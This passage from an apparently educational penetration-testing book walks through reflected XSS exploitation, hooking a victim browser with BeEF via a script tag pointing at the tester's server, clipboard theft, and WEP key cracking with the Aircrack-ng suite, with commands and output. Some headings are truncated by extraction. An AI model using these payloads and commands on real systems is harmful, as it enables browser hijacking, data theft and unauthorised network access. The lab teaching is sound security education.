When we browse to http://192.168.20.12/bookservice/test.txt, we see the 
output of our ipconfig command, as shown in Figure 14-19. 
Figure 14-19: Command execution output 
Figure 14-18: Newsletter 
Signup
Web Application Testing 329
We will be limited to the privileges of the Internet Information Services 
(IIS) user. Unfortunately for us, the Microsoft IIS application on Windows 7 
systems runs as a separate account without the full privileges of a system 
user: a better security scenario for the developer but a more challenging 
one for us. 
Though we don‚Äôt have full access, we will be able to gather a lot of 
information about the system with the access we do have. For example, we 
can use the dir command to find interesting files, or the command netsh 
advfirewall firewall show rule name=all to see the rules in the Windows 
firewall. 
Since we are on a Windows system we cannot use wget from the command line to pull down an interactive shell, but we can use various other 
methods to do so. In Chapter 8 we used TFTP to transfer a shell from our 
Kali system to the Windows XP target. Windows 7 does not have a TFTP 
client installed by default, but in Windows 7 we do have a powerful scripting 
language called Powershell, which we can use for tasks such as downloading 
and executing a file. 
N ote A study of Powershell is outside of the scope of this book, but it is very helpful for post
exploitation on the latest Windows operating systems. A good reference can be found 
here: http://www.darkoperator.com/powershellbasics/.
Cross-Site Scripti
Perhaps the most common and most debated web application security vulnerability is cross-site scripting (XSS). When such vulnerabilities are present, attackers can inject malicious scripts into an otherwise innocuous site 
to be executed in the user‚Äôs browser. 
XSS attacks are typically broken into two categories: stored and reflected. 
Stored XSS attacks are stored on the server and executed whenever a user visits 
the page where the script is stored. User forums, reviews, and other places 
where users can save input displayed to other users are ideal places for these 
sorts of attacks. Reflective XSS attacks are not stored on the server but are created by sending requests with the XSS attack itself. The attacks occur when 
user input is included in the server‚Äôs response, for example, in error messages 
or search results. 
Reflected XSS attacks rely on a user sending a request with the XSS 
attack included, so there will likely be some sort of social-engineering component to the attack as well. In fact, having XSS might actually increase the 
success of a social-engineering attack, because you can craft a URL that is 
part of a real website‚Äîa website the user knows and trusts‚Äîand use the 
XSS to, for instance, redirect the user to a malicious page. Like the other 
attacks discussed in this chapter, XSS attacks rely on a lack of user input 
sanitation, which allows us to create and run a malicious script.
330 Chapter 14 
Checking for a Reflected XSS Vulnerability
We should check any user input for XSS vulnerabilities. We‚Äôll find that our 
application has a reflected XSS vulnerability in the search functionality. Try 
searching for the title xss in the Books Search box, as shown in Figure 14-20. 
As shown in Figure 14-21, the search results page prints the original 
user input as part of the results. If the user input is not properly sanitized, 
this may be where we can use XSS.
The typical first XSS test to try to run is a JavaScript alert box. The 
following code will attempt to put up a JavaScript alert with the text xss. If 
user input is not properly filtered, the script will be executed as part of the 
search results page.
<script>alert('xss');</script>
In some cases, the user‚Äôs browser will automatically block obvious XSS attacks such as this 
one, and Iceweasel is one such browser. Switch over 
to your Windows 7 target with Internet Explorer. 
As shown in Figure 14-22, the pop-up alert script 
executes.
Having determined that reflective XSS is 
present, we could try to leverage it to attack users. 
Common attacks include stealing session cookies 
to send to an attacker-controlled site or embedding a frame (a way of splitting an HTML page 
into different segments) to prompt the user for 
login credentials. A user may think that the frame 
is part of the original page and enter his or her credentials, which are then sent offsite to the attacker. 
Figure 14-20: Search 
function
Figure 14-21: Search results page
Figure 14-22: XSS 
pop-up
Web Application Testing 331
Leveraging XSS with the Browser Exploitation Framework
XSS issues tend to be overlooked. How much damage can an alert box that 
says ‚ÄúXSS‚Äù do anyway? A good tool for leveraging XSS issues and uncovering 
their true attack potential is the Browser Exploitation Framework (BeEF). 
Using BeEF, we can ‚Äúhook‚Äù a browser by tricking the user into browsing to 
our BeEF server, or better yet using the BeEF JavaScript hook as a payload 
in the presence of an XSS vulnerability like the one discussed previously. 
Now change directories to /usr/share/beef-xss, and run ./beef, as shown 
in Listing 14-3. This will start the BeEF server, including the web interface 
and the attack hook. 
root@kali:~# cd /usr/share/beef-xss/
root@kali:/usr/share/beef-xss# ./beef
[11:53:26][*] Bind socket [imapeudora1] listening on [0.0.0.0:2000].
[11:53:26][*] Browser Exploitation Framework (BeEF) 0.4.4.5-alpha
--snip--
[11:53:27][+] running on network interface: 192.168.20.9
[11:53:27] | Hook URL: http://192.168.20.9:3000/hook.js
[11:53:27] |_ UI URL: http://192.168.20.9:3000/ui/panel
[11:53:27][*] RESTful API key: 1c3e8f2c8edd075d09156ee0080fa540a707facf
[11:53:27][*] HTTP Proxy: http://127.0.0.1:6789
[11:53:27][*] BeEF server started (press control+c to stop)
Listing 14-3: Starting BeEF
Now in Kali, browse to http://192.168.20.9:3000/ui/panel to access the 
BeEF web interface. You should be presented with a login page, like the one 
shown in Figure 14-23. 
Figure 14-23: BeEF login page
332 Chapter 14 
The default credentials for BeEF are beef:beef. After you enter them in 
the login dialog, you are shown the web interface (Figure 14-24). 
Figure 14-24: BeEF web interface 
Currently no browsers are hooked in BeEF, so we need to trick someone into loading and running BeEF‚Äôs malicious hook.js script. Let‚Äôs return to 
our XSS vulnerability in the Book Search box. This time, instead of using 
an alert dialog, let‚Äôs leverage the issue to load BeEF‚Äôs hook.js in the target 
browser. From the Windows 7 Internet Explorer browser, enter "<script 
src=http://192.168.20.9:3000/hook.js></script>" into the Book Search box, 
and click Go. This time there will be no alert box or other indication to 
the user suggesting that anything is amiss, but if you turn back to BeEF, you 
should see the IP address of the Windows 7 box in the Online Browsers list 
at the left of the screen, as shown in Figure 14-25. 
In the details pane, with the IP address of Windows 7 selected in BeEF, 
you can see details about the hooked browser as well as the underlying 
system, such as versions and installed software. At the top of the pane are 
additional tabs, such as Logs and Commands. Click Commands to see additional BeEF modules you can run against the hooked browser. 
Web Application Testing 333
Figure 14-25: A hooked browser
For example, as shown in Figure 14-26, navigate to Browser4Hooked 
Domain4Create Alert Dialog. At the right of the screen, you have the option 
to change the alert text. When you finish, click Execute at the bottom right. 
Figure 14-26: Running a BeEF module
334 Chapter 14 
Turn back to your Windows 7 browser. You should see the pop-up 
dialog, shown in Figure 14-27. 
Figure 14-27: Causing an alert in the hooked browser
Another interesting BeEF command allows you to steal data from the 
Windows clipboard. On the Windows 7 system, copy some text to the clipboard. Now in BeEF, navigate in the Commands Module Tree to Host4Get 
Clipboard. The text on the clipboard is displayed in the Command Results 
Pane on the right, as shown in Figure 14-28.
Figure 14-28: Stealing clipboard information 
In this section we have looked at only two simple examples of leveraging a hooked browser with BeEF. There is plenty more we can do. For 
example, we can use the target browser as a pivot to start gathering information about the local network with ping sweeps or even port scans. You 
Web Application Testing 335
can even integrate BeEF with Metasploit. On your pentests, you can use 
BeEF as part of social-engineering attacks. If you can find an XSS in your 
client‚Äôs web server, you can improve the results of your campaign by directing users not to a attacker-owned site but rather to the company website 
they trust. 
Cross-Site Request Forger
Cross-site scripting exploits the trust a user has in a website, whereas a similar vulnerability class called cross-site request forgery (CSRF) exploits a website‚Äôs 
trust in the user‚Äôs browser. Consider this scenario: A user is logged in to 
a banking website and has an active session cookie. Naturally, the user is 
also browsing to other websites in other tabs. The user opens a malicious 
website that contains a frame or image tag that triggers a HTTP request 
to the banking website with the correct parameters to transfer funds to 
another account (presumably the attacker‚Äôs account). The banking website, 
of course, checks to see that the user is logged in. Finding that the user‚Äôs 
browser has a currently active session, the banking website executes the 
command in the request, and the attacker steals the user‚Äôs money. The user, 
of course, never initiated the transaction‚Äîhe just had the misfortune of 
browsing to a malicious website.
Web Application Scanning with w
It is difficult to automate testing with a tool, particularly for custom applications. Nothing compares to a skilled web application tester with a proxy. 
That said, several commercial web application scanners and some free and 
open source scanners can automate tasks such as crawling the website and 
searching for known security issues. 
One open source web application scanner is the Web Application Attack 
and Audit Framework (w3af). w3af is made up of plugins that perform different web application‚Äìtesting tasks, such as looking for URLs and parameters 
to test and testing interesting parameters for SQL injection vulnerabilities. 
Now start w3af, as shown here.
root@kali:~# w3af
The w3af GUI will be launched and should look similar to Figure 14-29. 
On the left of the screen are the scan configuration profiles. By default 
you are in an empty profile, which allows you to fully customize which w3af 
plugins are run against your target. You can also use several preconfigured profiles. For example, the OWASP_Top10 profile will crawl the app 
with plugins from the discovery section as well as run plugins from the 
audit section that look for vulnerabilities from the Open Web Application 
Security Project (OWASP)‚Äôs top ten vulnerability categories. Enter the URL 
to be scanned, as shown in Figure 14-29, and click Start at the right of the 
window. 
336 Chapter 14 
Figure 14-29: Using w3af 
As the scan runs, details will be shown in the Logs tab, and issues discovered will be added to the Results tab (Figure 14-30). 
Figure 14-30: w3af results 
Web Application Testing 337
w3af finds the SQL injection vulnerability that we exploited at the start 
of this chapter as well as some minor issues that are worth adding to your 
pentest report. You can try other w3af profiles or create your own, customizing which plugins are run against the app. w3af can even do a credentialed scan, in which it has an active logged-in session with the app, giving 
it access to additional functionality to search for issues. 
Summar
In this chapter we took a brief look at examples of common web application 
vulnerabilities in a sample application built without the input sanitation 
needed to mitigate many attacks. Our bookservice app has a SQL injection 
vulnerability in its books details page. We were able to extract data from the 
database and even get a system command shell. 
We found a similar injection vulnerability in the XML-based login 
functionality. We were able to use a crafted query to bypass authentication and log in as the first user stored in the AuthInfo.xml file. We were also 
able to use the newsletter page to see the source of arbitrary pages in the 
web application including the authentication information‚Äîthe result of a 
lack of access control on the pages as well as a local file inclusion issue. We 
were able to run commands on the system by chaining them with the email 
address to sign up for newsletters, and we were able to write the output of 
commands to a file and then access them through the browser. We found 
an example of reflective XSS in the search functionality. We used BeEF 
to leverage this XSS issue and gain control of a target browser, giving us a 
foothold in the system. Finally, we looked briefly at an open source web vulnerability scanner, w3af. 
Web application testing deserves much more discussion than we can 
devote to it in this book. All the issues covered in this chapter are discussed 
in detail on OWASP‚Äôs website https://www.owasp.org/index.php/Main_Page/, 
which is a good starting point for continuing your study of web application 
security. OWASP also publishes a vulnerable app, Webgoat, which uses exercises to give users hands-on experience exploiting web application issues 
like the ones in this chapter, as well as others. Working through Webgoat is 
a great next step if you want to learn more about testing web apps. 
Another thing to note is that our application is an ASP.net application 
running on Windows. In your pentesting career, you will encounter other 
kinds of applications, such as Apache/PHP/MySQL applications running 
on Linux, or a Java web application. You may also find yourself testing applications that use APIs such as REST and SOAP to transfer data. Though the 
underlying issues caused by lack of input sanitation can occur on any platform, the particular coding mistakes and the syntax to exploit them may 
vary. Be sure to become familiar with different kinds of applications as you 
continue to study web application security.

15
W ireless Attack
In this chapter we‚Äôll take a brief look at wireless security. So far we‚Äôve looked at several ways to breach 
the security perimeter. But web application security, 
firewalls, security-awareness training, and so on can 
do nothing to protect an internal network if there‚Äôs 
an attacker sitting on a bench in front of the target 
organization‚Äôs building and the organization provides 
wireless access with weak encryption to the internal 
network. 
Setting 
For the examples in this chapter, I‚Äôll be using a Linksys WRT54G2 wireless router, but any router that supports WEP and WPA2 encryption will 
work. By default, my Linksys router has a web administration interface at 
http://192.168.20.1, as shown in Figure 15-1. The default username and 
340 Chapter 15
password for the router is admin:admin. The default credentials vary from 
device to device, but it‚Äôs common on penetration tests to find routing 
equipment that still uses the default credentials‚Äîa failing that could allow 
attackers to gain administrative control over the routers. 
N ote We won‚Äôt cover attacking networking devices in this book, but take a look at the
administrative interfaces on any networking equipment you have. Attacker access to 
enterprise network devices can do significant damage and should not be overlooked.
Figure 15-1: Linksys WRT54G2 web interface 
I‚Äôll also be using an Alfa Networks AWUS036H USB wireless card. This 
card, and similar Alfa USB models, are ideal for wireless security assessments, 
particularly when working with virtual machines. VMware doesn‚Äôt have drivers for wireless cards, but it is capable of USB passthrough, allowing us to use 
the wireless drivers built into Kali Linux from a virtual machine. The use of 
a USB wireless card will allow us to assess wireless networks from our virtual 
machine. 
Viewing Available Wireless Interfaces
After attaching the Alfa wireless card to the Kali virtual machine, enter 
iwconfig to see the wireless interfaces available on your virtual machine. 
Note in my case that the Alfa card is attached as wlan0 u, as shown in 
Listing 15-1.
root@kali:~# iwconfig
wlan0u IEEE 802.11bg ESSID:off/any 
 Mode:Managed Access Point: Not-Associated Tx-Power=20 dBm 
Wireless Attacks 341
 Retry long limit:7 RTS thr:off Fragment thr:off
 Encryption key:off
 Power Management:off
 
lo no wireless extensions.
eth0 no wireless extensions.
Listing 15-1: Kali Linux wireless interfaces
Scan for Access Points
Now we can scan for nearby access points. The command iwlist wlan0 scan
will scan for nearby access points using the wlan0 interface, as shown in 
Listing 15-2.
root@kali:~# iwlist wlan0 scan
 Cell 02 - Address: 00:23:69:F5:B4:2Bu
 Channel:6v
 Frequency:2.437 GHz (Channel 6)
 Quality=47/70 Signal level=-63 dBm 
 Encryption key:offw
 ESSID:"linksys"x
 Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
 9 Mb/s; 14 Mb/s; 18 Mb/s
 Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
 Mode:Master
--snip--
Listing 15-2: Scanning for nearby wireless access points 
From this initial scan we gather almost all the information we‚Äôll need 
in order to attack the base station, as you‚Äôll see later in the chapter. We have 
its MAC address u, the channel it‚Äôs broadcasting on v, we learn that it‚Äôs not 
using encryption at this time w, and we have its SSID x.
Monitor Mo
Before proceeding, let‚Äôs put our Alfa card into monitor mode. Much like 
promiscuous mode in Wireshark, monitor mode allows us to see additional 
wireless traffic on top of the traffic intended for our wireless card. We‚Äôll 
use the Airmon-ng script, part of the Aircrack-ng wireless assessment suite, 
to put the Alfa card into monitor mode. First, make sure that no running 
processes will interfere with monitor mode by entering airmon-ng check, as 
shown in Listing 15-3.
root@kali:~# airmon-ng check
Found 2 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!
-e 
342 Chapter 15
PID Name
2714 NetworkManager
5664 wpa_supplicant
Listing 15-3: Checking for interfering processes 
As you can see, Airmon found two running processes that could interfere. Depending on your wireless card and its drivers, you may or may not 
run into any trouble if you don‚Äôt kill off these programs. The card we‚Äôre 
using shouldn‚Äôt have trouble, but some USB wireless cards do. To kill all 
interfering processes in one step, enter airmon-ng check kill, as shown in 
Listing 15-4.
root@kali:~# airmon-ng check kill
Found 2 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!
-e 
PID Name
2714 NetworkManager
5664 wpa_supplicant
Killing all those processes...
Listing 15-4: Killing interfering processes 
Now enter airmon-ng start wlan0 to switch the wireless interface into 
monitor mode, as shown in Listing 15-5. This will allow us to capture packets not intended for us. Airmon-ng creates the wireless interface mon0 u. 
root@kali:~# airmon-ng start wlan0
Interface Chipset Driver
wlan0 Realtek RTL8187L rtl8187 - [phy0]
 (monitor mode enabled on mon0) u
Listing 15-5: Putting the Alfa card in monitor mode
Capturing Packets
With our interface in monitor mode, let‚Äôs see what data we can gather using 
Airodump-ng from the Aircrack-ng suite. Airodump-ng is used to capture 
and save wireless packets. Listing 15-6 shows how we tell Airodump-ng to 
use the wireless interface in monitor mode mon0. 
root@kali:~# airodump-ng mon0 --channel 6
 CH 6 ][ Elapsed: 28 s ][ 2015-05-19 20:08
 BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID
 00:23:69:F5:B4:2Bu -30 53 2 0 6 54 . OPNv linksysw
Wireless Attacks 343
 BSSID STATION PWR Rate Lost Frames Probe 
 00:23:69:F5:B4:2B 70:56:81:B2:F0:53x -21 0 -54 42 19 
Listing 15-6: Starting a packet dump with Airodump-ng
The Airodump-ng output gathers information about the wireless packets, 
including the base service set identification (BSSID), which is the base station‚Äôs MAC address u. We also see additional information such as the encryption algorithm used for wireless security v and the Service Set Identification 
(SSID) w. Airodump-ng also picks up the MAC addresses of connected 
clients x and the MAC address of my host machine attached to the wireless 
access point. (We‚Äôll examine the other fields in the Airodump-ng output as 
we move through cracking wireless security later in the chapter.) 
Now we know the Linksys access point is open, with no security. 
Open Wireles
Open wireless networks are a real disaster from a security perspective 
because anyone within antenna range of the access point can connect to 
that network. While open networks could require authentication after connection, and some do, many just let anyone connect. 
Also, the wireless packets traveling through an open network are not 
encrypted, and anyone listening can see any data in plaintext. Sensitive 
data may be secured by protocols like SSL, but that‚Äôs not always the case. 
For instance, FTP traffic on an open wireless network is completely unencrypted, including login information, and we don‚Äôt even need to use ARP 
or DNS cache poisoning to capture the packets. Any wireless card in monitor mode will be able to see the unencrypted traffic. 
Now let‚Äôs look at attacking networks that deploy various security protocols 
that keep unwanted entities from connecting to the network and intercepting traffic. 
Wired Equivalent Priva
Many routers that come with encryption enabled use older encryption 
called wired equivalent privacy (WEP) by default. The fundamental problem 
with WEP is that flaws in its algorithm make it possible for an attacker to 
recover any WEP key. WEP uses the Rivest Cipher 4 (RC4) stream cipher 
and a pre-shared key. Anyone who wants to connect to the network can use 
the same key, made up of a string of hexadecimal digits, for both encryption and decryption. The plaintext (unencrypted) data undergoes an exclusive or (XOR) bitwise operation with the keystream to create encrypted 
ciphertext. 
344 Chapter 15
The bitwise XOR operation has four possibilities: 
‚Ä¢	 0 XOR 0 = 0
‚Ä¢	 1 XOR 0 = 1
‚Ä¢	 0 XOR 1 = 1
‚Ä¢	 1 XOR 1 = 0
The zeros and ones in the bitstream in Figures 15-2 and 15-3 can represent 
any data being sent over the network. Figure 15-2 shows how the plaintext is 
XORed with the keystream to create the ciphertext.
Plaintext: 101101100000111100101010001000...
Keystream: 110001101011100100011100110100...
Ciphertext: 011100001011011100100110001100...
Figure 15-2: WEP encryption 
When decrypted, the same keystream is XORed against the ciphertext 
to restore the original plaintext, as shown in Figure 15-3. 
Ciphertext: 011100001011011100100110001100...
Keystream: 110001101011100100011100110100...
Plaintext: 101101100000111100101010001000...
Figure 15-3: WEP decryption 
The shared WEP key can be either 64 or 148 bits. In either case, an 
initialization vector (IV) makes up the first 24 bits of the key to add randomness, making the effective key length really only 40 or 104 bits. Adding 
randomness with an IV is common in cryptographic systems because if the 
same key is used repeatedly, attackers can examine the resulting ciphertext 
for patterns and potentially break the encryption. 
Wireless Attacks 345
N ote Cryptanalysts often find that randomness is not correctly implemented in cryptographic algorithms, as is the case with WEP. For starters, WEP‚Äôs 24 bits of randomization is minimal by modern cryptographic standards
The IV and key are concatenated, then run through a key-scheduling 
algorithm (KSA) and a pseudorandom number generator (PRNG) to create the keystream. (I‚Äôll skip the math here.) Next, an integrity check value 
(ICV) is computed and concatenated with the plaintext before encryption 
in order to prevent attackers from intercepting the ciphertexts, flipping 
some bits, and changing the resulting decrypted plaintext to something 
malicious or, at least, misleading. The plaintext is then XORed with the keystream (as shown in Figure 15-2). The resulting packet is made up of the IV, 
the ICV, the ciphertext, and a two-bit key ID, as shown in Figure 15-4. 
IV
key ID
ciphertext
ICV
IV
key
message
ICV
KSA PRNG
Figure 15-4: WEP encryption 
Decryption is similar, as shown in Figure 15-5. The IV and key (denoted 
by the key ID), stored in plaintext as part of the packet, are concatenated 
and run through the same key-scheduling algorithm and pseudorandom 
number generators to create a keystream identical to the one used for 
encryption. The ciphertext is then XORed with the keystream to reveal 
the plaintext and the ICV. Finally, the decrypted ICV is compared with the 
plaintext ICV value appended to the packet. If the values don‚Äôt match, the 
packet is thrown out. 
346 Chapter 15
IV
key ID
ciphertext
ICV
key
KSA PRNG
message
ICV
Figure 15-5: WEP decryption
WEP Weaknesses
Unfortunately, WEP has some inherent problems that allow an attacker to 
recover a key or alter legitimate packets. In fact, every WEP key is recoverable by an attacker armed with enough ciphertexts encrypted with the same 
shared key. The only cryptosystem that is truly secure is a random one-time 
pad, which uses a specific key only once. The main trouble with WEP is that 
the 24-bit IV doesn‚Äôt introduce enough randomness; it has at most 224 (that 
is, 16,777,216) values. 
There is no standard way for wireless cards and access points to compute IVs, and in practice, the IV space used may be even smaller. Either way, 
given enough packets, IVs will be reused, and the same value (static key 
concatenated with the IV) will be used to generate the ciphertext. By passively listening for traffic (or better yet, injecting traffic into the network to 
force more packets and, thus, more IVs to be generated), an attacker can 
gather enough packets to perform cryptanalysis and recover the key. 
Similarly, the ICV that attempts to keep attackers from intercepting the 
encrypted message, flipping bits, and changing the resulting plaintext is 
insufficient. Unfortunately, weaknesses in the ICV implementation Cyclic 
Redundancy Check 32 (CRC-32) may allow attackers to craft the correct 
ICV for a modified message. Because CRC-32 is a linear algorithm, flipping 
a specific bit in the ciphertext has a deterministic result on the resulting 
ICV, and an attacker with knowledge of how CRC-32 is calculated could 
cause a modified message to be accepted. Thus, the ICV implementation, 
like the IV, is not considered sound by modern cryptographic standards. 
We can use the Aircrack-ng suite to recover the shared key from a wireless network secured with WEP. Again, the math behind the cryptographic 
attacks is beyond the scope of this book. Luckily, we have tools that will take 
care of the hard stuff if we can capture the required traffic. 
Wireless Attacks 347
Cracking WEP Keys with Aircrack-ng 
There are multiple ways to crack WEP keys, including the fake authentication attack, fragmentation attack, chopchop attack, caff√© latte attack, and 
PTW attack. We‚Äôll take a closer look at the fake authentication attack, which 
requires at least one legitimate client connected to the access point. 
We‚Äôll use the host system to simulate an attached client. First, change 
the wireless security on your router to WEP (see your user guide if you need 
help), and then make sure your wireless card is in monitor mode so that you 
can capture traffic from the network without first authenticating. 
Now to see what data we can collect using the Airodump-ng tool from 
Aircrack-ng. Tell Airodump-ng to use the wireless interface in monitor mode 
mon0, as shown in Listing 15-7, and use the -w flag to save all packets to a file.
root@kali:~# airodump-ng -w book mon0 --channel 6
 CH 6 ][ Elapsed: 20 s ][ 2015-03-06 19:08 
 BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID
 00:23:69:F5:B4:2Bu -53 22 6 0 6v 54 . WEPw WEP linksysx
 BSSID STATION PWR Rate Lost Frames Probe 
 00:23:69:F5:B4:2B 70:56:81:B2:F0:53 -26 54-54 0 6
Listing 15-7: Airodump-ng capture for WEP cryptanalysis
This initial scan gathers all the information we need to begin a WEP 
attack against the base station. Here we have the BSSID u, wireless channel v, encryption algorithm w, and the SSID x. We‚Äôll use this information 
to gather the packets to crack the WEP key. Your own setup‚Äôs information is 
likely different, of course, but here‚Äôs what we‚Äôll work with:
‚Ä¢	 Base Station MAC Address: 00:23:69:F5:B4:2B
‚Ä¢	 SSID: linksys
‚Ä¢	 Channel: 6
Injecting Packets
Although the Airodump-ng output in Listing 15-7 shows some traffic from 
the access point, to crack a 64-bit WEP key, we need about 250,000 IVs, and 
for a 148-bit WEP key, about 1,500,000. Rather than idly listen for packets, 
we‚Äôll capture and retransmit packets to the access point to generate unique 
IVs quickly. We need to authenticate, because if our MAC address isn‚Äôt 
authenticated with the access point, any packets we send will be dropped, 
and we‚Äôll receive a deauthentication request. We‚Äôll use Aireplay-ng to fake 
authentication with the access point and trick it into responding to our 
injected packets. 
When using fake authentication, we tell the access point we‚Äôre ready to 
prove we know the WEP key, as shown in Listing 15-8. Of course, because 
we don‚Äôt know the key yet, we don‚Äôt send it, but our MAC address is now on 
the list of clients that can send packets to the access point, hence the fake 
authentication.
348 Chapter 15
root@kali:~# aireplay-ng -1 0 -e linksys -a 00:23:69:F5:B4:2B -h 00:C0:CA:1B:69:AA mon0
20:02:56 Waiting for beacon frame (BSSID: 00:23:69:F5:B4:2B) on channel 6
20:02:56 Sending Authentication Request (Open System) [ACK]
20:02:56 Authentication successful
20:02:56 Sending Association Request [ACK]
20:02:56 Association successful :-) (AID: 1) u
Listing 15-8: Fake authentication with Aireplay-ng
We fake authentication using the following flags with their associated data:
‚Ä¢	 -1 tells Aireplay-ng to fake authentication.
‚Ä¢	 0 is the retransmission time.
‚Ä¢	 -e is the SSID; in my case linksys.
‚Ä¢	 -a is the MAC address of the access point we want to authenticate with.
‚Ä¢	 -h is the MAC address of our card (which should be on a sticker on the 
device). 
‚Ä¢	 mon0 is the interface to use for the fake authentication. 
After sending the Aireplay-ng request, you should receive a smiley face 
and indication that authentication was successful u.
Generating IVs with the ARP Request Relay Atta
With the base station willing to accept packets from us, we can capture 
and rebroadcast legitimate packets. While the access point won‚Äôt allow us 
to send traffic without first sending the WEP key to authenticate, we can 
rebroadcast traffic from properly authenticated clients. 
We‚Äôll use the attack technique known as ARP Request Replay to generate IVs quickly by having Aireplay-ng listen for an ARP request and then 
retransmit it back to the base station. (When the access point receives an 
ARP request, it rebroadcasts it with a new IV.) Aireplay-ng will rebroadcast 
the same ARP packet repeatedly, and each time it‚Äôs broadcast, it will have a 
new IV. 
Listing 15-9 shows the attack in action. Aireplay-ng reads packets looking for an ARP request. You won‚Äôt see any data until Aireplay-ng sees an 
ARP request it can rebroadcast. We will see that next. 
root@kali:~# aireplay-ng -3 -b 00:23:69:F5:B4:2B -h 00:C0:CA:1B:69:AA mon0
20:14:21 Waiting for beacon frame (BSSID: 00:23:69:F5:B4:2B) on channel 6
Saving ARP requests in replay_arp-1142-201521.cap
You should also start airodump-ng to capture replies.
Read 541 packets (got 0 ARP requests and 0 ACKs), sent 0 packets...(0 pps)
Listing 15-9: Rebroadcasting ARP packets with Aireplay-ng
Wireless Attacks 349
We use these options:
‚Ä¢	 -3 performs the ARP request replay attack.
‚Ä¢	 -b is the base station MAC address.
‚Ä¢	 -h is our Alfa card MAC address.
‚Ä¢	 mon0 is the interface. 
Generating an ARP Reques
Unfortunately, as you can see in Listing 15-9, we don‚Äôt see any ARP requests. 
To generate an ARP request, we‚Äôll use the host system as a simulated client 
by pinging an IP address on the network from the connected host system. 
Aireplay-ng will see the ARP request and retransmit it to the access point 
over and over.
As you can see in the Airodump-ng screen, shown in Listing 15-10, the 
#Data u number, indicating captured IVs, increases rapidly as Aireplay-ng 
continues to retransmit the ARP packet, causing the access point to generate more IVs. (If your aireplay-ng -3 says "Got adeauth/disassoc" or something 
similar and your #Data number is not quickly rising, run the fake association 
command from Listing 15-8 again to reassociate with the access point. Your 
#Data field should again start rising rapidly.)
 CH 6 ][ Elapsed: 14 mins ][ 2015-11-22 20:31
 BSSID PWR RXQ Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID
 00:23:69:F5:B4:2B -63 92 5740 85143u 389 6 54 . WEP WEP OPN linksys
Listing 15-10: IVs being captured in Airodump-ng
Cracking the Key
Remember, we need about 250,000 IVs to crack a 64-bit WEP key. As long 
as you remain associated with the base station, as shown in Listing 15-8, 
(rerunning the command if it becomes necessary) and have generated an 
ARP request on the network, it should only take a few minutes to collect 
enough IVs. Once we‚Äôve gathered enough IVs, we can use Aircrack-ng to do 
the math to turn the collected IVs into the correct WEP key. Listing 15-11 
shows how we crack the key by using the -b flag and providing the filename 
we used in Airodump-ng followed by *.cap u. This tells Aircrack-ng to read 
from all .cap files saved by Airodump-ng. 
root@kali:~# aircrack-ng -b 00:23:69:F5:B4:2B book*.capu
Opening book-01.cap
Attack will be restarted every 5000 captured ivs.
Starting PTW attack with 239400 ivs.
KEY FOUND! [ 2C:85:8B:B6:31 ] v
Decrypted correctly: 100%
Listing 15-11: Recovering the WEP key with Aircrack-ng
350 Chapter 15
After a few seconds of analysis Aircrack-ng returns the correct key v. 
We can now authenticate with the network. If this were a pentest client‚Äôs 
network, we could now directly attack any systems on the network.
Challenges with WEP Cracking
As with many topics discussed in this book, information about wireless 
attacks could fill a book, and I‚Äôve shown you only one attack. One thing 
to keep in mind when attacking WEP is that clients may use filters in an 
attempt to thwart attacks like this. For example, access points could use 
MAC filtering to allow only wireless cards with certain MAC addresses to 
connect, and if your Alfa card isn‚Äôt on the list, your fake authentication 
attempt will fail. To bypass MAC filtering, you could use a tool like MAC 
Changer in Kali to spoof a MAC address and create an accepted value. 
Keep in mind that WEP keys are always crackable if we can gather enough 
packets, and for security reasons, WEP encryption should not be used in 
production. 
It‚Äôs worth noting that the Wifite tool, installed by default in Kali Linux, 
behaves as a wrapper around the Aircrack-ng suite and will automate the 
process of attacking wireless networks, including cracking WEP. But while 
you are learning how Wi-Fi attacks work, it is better to walk through the 
process step by step instead of using an automation wrapper.
We now turn our attention to the stronger wireless encryption protocols, WPA and WPA2. 
Wi-Fi Protected Acce
As weaknesses in WEP came to light, a more robust wireless security system 
was needed and a new system (which ultimately became WPA2) was built 
to replace WEP. However, the creation of a secure cryptographic system for 
wireless took time, and in the meantime, additional security was needed 
that was compatible with deployed wireless hardware. Thus, Wi-Fi Protected 
Access (WPA), also known as Temporal Key Integrity Protocol (TKIP), was born. 
WPA uses the same underlying algorithm as WEP (RC4) but seeks to 
address WEP‚Äôs weaknesses by adding keystream randomness to IVs and 
integrity to ICV. Unlike WEP, which uses a 40- or 104-bit key combined with 
weak IVs for each packet, WPA generates a 148-bit key for each packet to 
ensure that each packet is encrypted with a unique keystream. 
Additionally, WPA replaces WEP‚Äôs weak CRC-32 message integrity check 
with a message authentication code (MAC) algorithm called Michael, to prevent attackers from easily calculating the resulting changes to the ICV when 
a bit is flipped. Though both WPA and even WPA2 have their weaknesses, 
the most common vulnerability (which we‚Äôll exploit later in this chapter) 
is the use of weak passphrases. 
Wireless Attacks 351
WP
WPA2 was built from the ground up to provide a secure encryption system 
for wireless networks. It implements an encryption protocol built specifically for wireless security called Counter Mode with Cipher Block Chaining 
Message Authentication Code Protocol (CCMP). CCMP is built on the Advanced 
Encryption Standard (AES).
WPA and WPA2 support both personal and enterprise setups. WPA/
WPA2 personal uses a pre-shared key, similar to WEP. WPA/WPA2 enterprise adds an additional element called a Remote Authentication Dial-In User 
Service (RADIUS) server to manage client authentication.
The Enterprise Connection Process
In WPA/WPA2 enterprise networks, the client connection process comprises four steps, as shown in Figure 15-6. First the client and the access 
point agree on mutually supported security protocols. Then, based on the 
authentication protocol chosen, the access point and the RADIUS server 
exchange messages to generate a master key. Once a master key is generated, a message that authentication was successful is sent to the access point 
and passed on to the client, and the master key is sent to the access point. 
The access point and the client exchange and verify keys for mutual authentication, message encryption, and message integrity via a four-way handshake, as discussed in ‚ÄúThe Four-Way Handshake‚Äù on this page. Following 
key exchange, traffic between the client and the access point is secured with 
WPA or WPA2. 
access point
client RADIUS server
protocol agreement
authentication
key distribution
encryption master key distribution
Figure 15-6: WPA/WPA2 enterprise connection 
The Personal Connection Process
The WPA/WPA2 personal connection process is slightly simpler than the 
enterprise one: No RADIUS server is required, and the entire process is 
